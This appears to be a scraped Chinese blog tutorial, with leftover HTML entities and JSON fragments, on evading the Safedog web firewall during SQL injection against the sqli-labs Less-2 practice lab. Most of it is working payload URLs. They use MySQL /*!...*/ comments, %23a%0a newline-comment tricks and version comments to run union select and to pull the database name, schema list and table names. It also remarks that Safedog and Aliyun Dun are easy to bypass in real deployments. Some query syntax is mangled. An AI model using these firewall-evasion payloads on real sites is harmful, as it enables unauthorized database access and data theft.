首先要判断安全狗识别的是哪一个关键字，怎么判断，在前面加上，干扰字符，比如a 判断安全狗拦截的union select 而并非union和select 我们看到aselect不会被拦截如何让aselect不执行给安全狗看 /* ! */符号是mysql一个特性就是，安全狗他在士必得时候会认为这是一个注释，不会对系统造成畏寒，所以，安全狗就不去拦截。 12http:127.0.0.1&#x2F;Less-2&#x2F;?id&#x3D;-1 union &#x2F;*select*&#x2F;1,2,3我们发现使用注释之后安全狗还进行拦截，怎么办呢 让aselect中a执行给安全狗看，实际执行的是select %0a 换行 %23 注释 让a单独在一行，然后把这个a注释掉，select是不是就正常执行了，安全狗这边会认为是一个正常的注释，不会拦截 payload：-1 union %23a%0a//select/1,2,3 12http:127.0.0.1&#x2F;Less-2&#x2F;?id&#x3D;-1 union %23a%0a&#x2F;*select*&#x2F;1,2,3这里我们发现了我们成功地绕过了安全狗的拦截 如果我们要查询数据库，还是按照之前的直接在2的位置打上database()是会被安全狗拦截的，所以我们判断安全狗拦截的是那一块内容，我们尝试在database(a)的括号里面加上一个a试试 12http:127.0.0.1&#x2F;Less-2&#x2F;?id&#x3D;-1 union %23a%0a&#x2F;*select*&#x2F;1,database(a),3发现报错了，表示括号里的a没有被拦截，我们就可以判断安全狗拦截的是database而不是括号 12所以我将其database和()括号分开http:127.0.0.1&#x2F;Less-2&#x2F;?id&#x3D;-1 union %23a%0a&#x2F;*select*&#x2F;1,&#x2F;*!database*&#x2F;&#x2F;*!()*&#x2F;,3 123我们发现还拦截，所以我们就可以按照之前换行，注释a换行database的方法来将database显示出来http:127.0.0.1&#x2F;Less-2&#x2F;?id&#x3D;-1 union %23a%0a&#x2F;*select*&#x2F;1,%23a%0a&#x2F;*!database*&#x2F;&#x2F;*!()*&#x2F;,3我们发现成功地返回了我们的库名，也就说明了安全狗没有去拦截这样的一个函数 12http:127.0.0.1&#x2F;Less-2&#x2F;?id&#x3D;-1 union %23a%0a&#x2F;*select*&#x2F;1,group_concat table_name from information_schema.schemata,3我们可以在每个函数里面都放一个a查看哪一个函数被拦截，之后经过测试from被拦截了，其他都没有被拦截然后我们可以将from进行a注释换行 1234先尝试&#x2F;*!from*&#x2F;如果被拦截还是用%23a%0a&#x2F;*!from*&#x2F;http:127.0.0.1&#x2F;Less-2&#x2F;?id&#x3D;-1 union %23a%0a&#x2F;*select*&#x2F;1,group_concat table_name %23a%0a&#x2F;*!from*&#x2F; information_schema.schemata,3我们发现成功地将内容显示出来了 获取一下表名 12http:127.0.0.1&#x2F;Less-2&#x2F;?id&#x3D;-1 union %23a%0a&#x2F;*select*&#x2F;1,group_concat table_name %23a%0a&#x2F;*!from*&#x2F; information_schema.tables where table_schema&#x3D;&#39;security&#39;,3直接返回成功，where并没有被拦截 安全狗防御防御效果很low。实际情况下，安全狗用的是最多的，但是，也是最好过的 安全狗，aliyundun，很好过，但是Godaddy很难过 mysql版本判断特性 /* 44509select */在mysql中不会进行报错的，这个44509是mysql的一个正常的判断，当mysql的版本大于44509就会执行select语句 1http:127.0.0.1&#x2F;Less-2&#x2F;?id&#x3D;-1 union &#x2F;*44509select*&#x2F; 1,2,3","categories":[],"tags":[]}],"categories":[],"tags":[]}